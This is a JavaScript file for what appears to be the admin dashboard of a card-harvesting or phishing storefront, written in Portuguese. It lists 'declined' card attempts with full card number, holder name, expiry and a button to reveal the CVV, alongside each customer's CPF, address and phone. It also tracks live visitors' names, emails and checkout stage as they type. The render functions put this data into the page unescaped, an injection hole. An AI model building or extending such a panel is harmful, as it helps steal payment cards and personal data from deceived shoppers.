        ? '<svg viewBox="308 0 36 24" fill="none" xmlns="http://www.w3.org/2000/svg" style="width:16px;height:12px;color:#10b981;vertical-align:middle;display:inline-block;margin-right:4px;"><path d="M322.844 15.4258C323.094 15.4267 323.341 15.378 323.571 15.2826C323.802 15.1872 324.011 15.0469 324.187 14.87L326.124 12.9324C326.193 12.8668 326.284 12.8302 326.38 12.8302C326.474 12.8302 326.566 12.8668 326.635 12.9324L328.58 14.878C328.756 15.0547 328.965 15.1947 329.196 15.29C329.426 15.3852 329.674 15.4339 329.923 15.433H330.305L327.85 17.8873C327.667 18.0698 327.451 18.2147 327.213 18.3135C326.975 18.4123 326.719 18.4632 326.462 18.4632C326.204 18.4632 325.948 18.4123 325.71 18.3135C325.472 18.2147 325.256 18.0698 325.073 17.8873L322.608 15.4258H322.844ZM329.923 8.56908C329.674 8.56832 329.427 8.61703 329.196 8.71235C328.966 8.80769 328.757 8.94775 328.58 9.12447L326.638 11.071C326.571 11.1384 326.479 11.1764 326.38 11.1764C326.288 11.1764 326.196 11.1384 326.128 11.071L324.191 9.13285C324.015 8.95591 323.806 8.81565 323.575 8.72024C323.345 8.62483 323.098 8.57616 322.848 8.57707H322.608L325.073 6.11395C325.442 5.74585 325.941 5.53906 326.462 5.53906C326.982 5.53906 327.481 5.74585 327.85 6.11395L330.305 8.56867L329.923 8.56908Z" fill="currentColor" /><path d="M320.575 10.6108L322.041 9.14431H322.844C323.196 9.1447 323.534 9.28408 323.784 9.53156L325.721 11.4693C325.808 11.5561 325.91 11.625 326.024 11.672C326.137 11.7191 326.258 11.7432 326.38 11.7432C326.503 11.7432 326.624 11.7191 326.737 11.672C326.85 11.625 326.953 11.5561 327.039 11.4693L328.984 9.52399C329.234 9.27623 329.572 9.13702 329.924 9.13672H330.876L332.348 10.6092C332.716 10.9774 332.923 11.4767 332.923 11.9973C332.923 12.5179 332.716 13.0172 332.348 13.3854L330.876 14.8579H329.923C329.571 14.8579 329.233 14.7181 328.983 14.4707L327.039 12.5245C326.861 12.3551 326.625 12.2605 326.38 12.2605C326.134 12.2605 325.899 12.3551 325.721 12.5245L323.783 14.4623C323.533 14.7097 323.196 14.8495 322.844 14.8495H322.041L320.575 13.387C320.393 13.2048 320.248 12.9884 320.15 12.7501C320.051 12.512 320 12.2568 320 11.9989C320 11.7411 320.051 11.4858 320.15 11.2476C320.248 11.0095 320.393 10.7931 320.575 10.6108Z" fill="currentColor" /></svg>' 
        : '<i class="fa-solid fa-credit-card" style="color:#fb923c"></i>';
      
      const isPix = tx.brand === 'PIX';
      const isPending = tx.status === 'PENDENTE';

      el.innerHTML = `
        <div class="pedido-header">
          <div class="pedido-header-left">
            <span class="status-badge ${statusClass}"><i class="fa-solid ${statusIcon}"></i> ${tx.status}</span>
            <span class="pedido-method">${brandIcon} ${tx.brand}</span>
            <span class="date-text">${tx.date}</span>
          </div>
          <div class="pedido-header-right">
            <span class="price-text">${currency(tx.amount)}</span>
            ${isPix && isPending ? `<button class="btn-mark-pay" data-id="${tx.id}"><i class="fa-solid fa-check"></i> Marcar Pago</button>` : ''}
            <button class="btn-delete-pedido" data-id="${tx.id}" title="Excluir"><i class="fa-solid fa-trash-can"></i></button>
          </div>
        </div>
        <div class="pedido-body">
          <div class="detail-block">
            <h4>CLIENTE</h4>
            <p><strong>${tx.client.name}</strong></p>
            <p>${tx.client.email}</p>
            <p>CPF: ${tx.client.cpf} · Tel: ${tx.client.phone}</p>
          </div>
          <div class="detail-block">
            <h4>ENDEREÇO</h4>
            <p>${tx.address.street}, ${tx.address.number}${tx.address.complement ? ' — ' + tx.address.complement : ''}</p>
            <p>${tx.address.neighborhood} · ${tx.address.city}/${tx.address.state} · CEP ${tx.address.cep}</p>
          </div>
          <div class="detail-block">
            <h4>VALORES</h4>
            <p>Produto: ${currency(tx.order.products)}</p>
            <p>Frete: ${currency(tx.order.shipping)}</p>
            <p><strong>Total: ${currency(tx.amount)}</strong></p>
          </div>
        </div>
      `;

      // Mark paid (restricted)
      const markPayBtn = el.querySelector('.btn-mark-pay');
      if (markPayBtn) {
        markPayBtn.addEventListener('click', async () => {
          if (!confirm('Marcar este pedido como PAGO no Supabase?')) return;
          try {
            const res = await fetch(`/api/transactions/${tx.id}/pay`, { method: 'PATCH' });
            if (res.status === 403) return alert('Apenas administradores/gerentes podem alterar pagamentos.');
            const data = await res.json();
            if (data.success) loadData();
          } catch (err) {
            console.error(err);
          }
        });
      }

      // Delete (restricted)
      el.querySelector('.btn-delete-pedido').addEventListener('click', async () => {
        if (!confirm('Excluir este pedido definitivamente?')) return;
        try {
          const res = await fetch(`/api/transactions/${tx.id}`, { method: 'DELETE' });
          if (res.status === 403) return alert('Apenas administradores/gerentes podem excluir pedidos.');
          const data = await res.json();
          if (data.success) loadData();
        } catch (err) {
          console.error(err);
        }
      });

      pedidosContainer.appendChild(el);
    });
  }

  function renderDeclinedCardsList() {
    const cardTxs = transactions.filter(t => t.brand !== 'PIX');

    statAttempts.textContent = cardTxs.length;
    const todayStr = new Date().toLocaleDateString('pt-BR', { timeZone: 'America/Sao_Paulo' });
    statToday.textContent = cardTxs.filter(t => t.date.split(',')[0].trim() === todayStr).length;
    statTotalValue.textContent = currency(cardTxs.reduce((s, t) => s + t.amount, 0));

    filterCountAll.textContent = cardTxs.length;
    filterCountMaster.textContent = cardTxs.filter(t => t.brand === 'MASTERCARD').length;
    filterCountVisa.textContent = cardTxs.filter(t => t.brand === 'VISA').length;

    container.querySelectorAll('.transaction-item').forEach(el => el.remove());
    loadingState.classList.add('hidden');

    let filtered = cardTxs.filter(t => {
      if (activeCardFilter !== 'TODAS' && t.brand !== activeCardFilter) return false;
      if (searchQuery) {
        const q = searchQuery.toLowerCase();
        return (t.client.name && t.client.name.toLowerCase().includes(q)) ||
               (t.client.email && t.client.email.toLowerCase().includes(q));
      }
      return true;
    });

    if (filtered.length === 0) {
      emptyState.classList.remove('hidden');
      return;
    }
    emptyState.classList.add('hidden');

    filtered.forEach(tx => {
      const el = document.createElement('div');
      el.className = 'transaction-item';
      el.id = `item-${tx.id}`;

      const brandClass = tx.brand === 'VISA' ? 'visa' : tx.brand === 'MASTERCARD' ? 'mastercard' : 'other';
      const isRevealed = !!revealedStates[tx.id];
      const cvvDisplay = isRevealed ? tx.card.cvv : '•••';
      const revealIcon = isRevealed ? 'fa-eye-slash' : 'fa-eye';
      const revealText = isRevealed ? 'Ocultar' : 'Revelar CVV';

      el.innerHTML = `
        <div class="item-header">
          <div class="header-left">
            <span class="brand-badge ${brandClass}">${tx.brand}</span>
            <span class="status-badge status-negado">${tx.status}</span>
            <span class="date-text">${tx.date}</span>
          </div>
          <div class="header-right">
            <span class="price-text">${currency(tx.amount)}</span>
            <button class="btn-delete" data-id="${tx.id}"><i class="fa-solid fa-trash-can"></i></button>
          </div>
        </div>
        <div class="item-body">
          <div class="admin-card-visual">
            <div class="admin-card-title-row">
              <span>DADOS DO CARTÃO</span>
              <button class="btn-reveal" data-id="${tx.id}">
                <i class="fa-regular ${revealIcon}"></i> <span>${revealText}</span>
              </button>
            </div>
            <p class="admin-card-number">${tx.card.number}</p>
            <div class="admin-card-details-row">
              <div><p class="admin-card-label">TITULAR</p><p class="admin-card-val">${tx.card.holder}</p></div>
              <div><p class="admin-card-label">VALIDADE</p><p class="admin-card-val">${tx.card.expiry}</p></div>
              <div class="admin-card-cvv-col"><p class="admin-card-label">CVV</p><p class="admin-card-val" id="cvv-${tx.id}">${cvvDisplay}</p></div>
            </div>
            <div class="admin-card-installments">Parcelas: ${tx.card.installments}</div>
          </div>
          <div class="item-details">
            <div class="details-grid">
              <div class="detail-block">
                <h4>CLIENTE</h4>
                <p><strong>${tx.client.name}</strong></p>
                <p>${tx.client.email}</p>
                <p>CPF: ${tx.client.cpf} · ${tx.client.phone}</p>
              </div>
              <div class="detail-block">
                <h4>ENDEREÇO</h4>
                <p>${tx.address.street}, ${tx.address.number}${tx.address.complement ? ' — ' + tx.address.complement : ''}</p>
                <p>${tx.address.neighborhood} · ${tx.address.city}/${tx.address.state} · CEP ${tx.address.cep}</p>
              </div>
            </div>
            <div class="summary-box">
              <div class="summary-col"><span class="summary-col-label">PRODUTO</span><span class="summary-col-val">${currency(tx.order.products)}</span></div>
              <div class="summary-col"><span class="summary-col-label">FRETE</span><span class="summary-col-val">${currency(tx.order.shipping)}</span></div>
              <div class="summary-col"><span class="summary-col-label">TOTAL</span><span class="summary-col-val total-val">${currency(tx.amount)}</span></div>
            </div>
          </div>
        </div>
      `;

      el.querySelector('.btn-reveal').addEventListener('click', (e) => {
        const id = e.currentTarget.getAttribute('data-id');
        revealedStates[id] = !revealedStates[id];
        const cvvEl = document.getElementById(`cvv-${id}`);
        const btn = e.currentTarget;
        const txData = transactions.find(t => t.id === id);
        if (revealedStates[id]) {
          cvvEl.textContent = txData.card.cvv;
          btn.innerHTML = '<i class="fa-regular fa-eye-slash"></i> <span>Ocultar</span>';
        } else {
          cvvEl.textContent = '•••';
          btn.innerHTML = '<i class="fa-regular fa-eye"></i> <span>Revelar CVV</span>';
        }
      });

      el.querySelector('.btn-delete').addEventListener('click', async () => {
        if (!confirm('Excluir esta transação?')) return;
        const res = await fetch(`/api/transactions/${tx.id}`, { method: 'DELETE' });
        if (res.status === 403) return alert('Apenas administradores/gerentes podem excluir transações.');
        const data = await res.json();
        if (data.success) loadData();
      });

      container.appendChild(el);
    });
  }

  function updateOnlineView() {
    const activeCount = onlineLeads.length;
    if (onlineBigCount) onlineBigCount.textContent = activeCount;
    if (onlineOrdersToday) onlineOrdersToday.textContent = transactions.length;

    // Detailed online view list
    if (activityList) {
      activityList.innerHTML = '';
      if (onlineLeads.length === 0) {
        activityList.innerHTML = '<li class="activity-item"><span class="text-muted">Nenhum visitante ativo no momento.</span></li>';
      } else {
        onlineLeads.forEach(lead => {
          const li = document.createElement('li');
          li.className = 'activity-item';
          const isMobile = lead.dispositivo === 'Mobile';
          const devIcon = isMobile ? '📱' : '💻';
          
          li.innerHTML = `
            <span class="activity-icon">${devIcon}</span>
            <div class="activity-info">
              <p><strong>${lead.nome || 'Visitante Anônimo'}</strong> (${lead.email || 'Aguardando digitação'})</p>
              <p class="activity-time">Etapa: <strong style="color:var(--primary);">${lead.status_etapa || 'Loja'}</strong> · IP: ${lead.session_id.substring(5, 14)} · URL: ${lead.url_atual}</p>
            </div>
            <span class="activity-amount" style="font-size:11px; color:var(--success); font-weight:700;">Ativo</span>
          `;
          activityList.appendChild(li);
        });
      }
    }
  }

  // Setup cards filters
  document.querySelectorAll('[data-filter]').forEach(btn => {
    btn.addEventListener('click', () => {
      document.querySelectorAll('[data-filter]').forEach(b => b.classList.remove('active'));
      btn.classList.add('active');
      activeCardFilter = btn.getAttribute('data-filter');
      renderDeclinedCardsList();
    });
  });

  if (searchInput) {
    searchInput.addEventListener('input', e => {
      searchQuery = e.target.value;
      renderDeclinedCardsList();
    });
  }

  document.querySelectorAll('[data-pedido-filter]').forEach(btn => {
    btn.addEventListener('click', () => {
      document.querySelectorAll('[data-pedido-filter]').forEach(b => b.classList.remove('active'));
      btn.classList.add('active');
      activePedidoFilter = btn.getAttribute('data-pedido-filter');
      renderPedidosList();
    });
  });

  if (searchPedidos) {
    searchPedidos.addEventListener('input', e => {
      searchPedidosQuery = e.target.value;
      renderPedidosList();
    });
  }

  // ===========================================================
  // Init
  // ===========================================================
  checkAuth();
  loadData();

  // Polling updates every 8 seconds
  setInterval(() => {
    loadData();
  }, 8000);
});
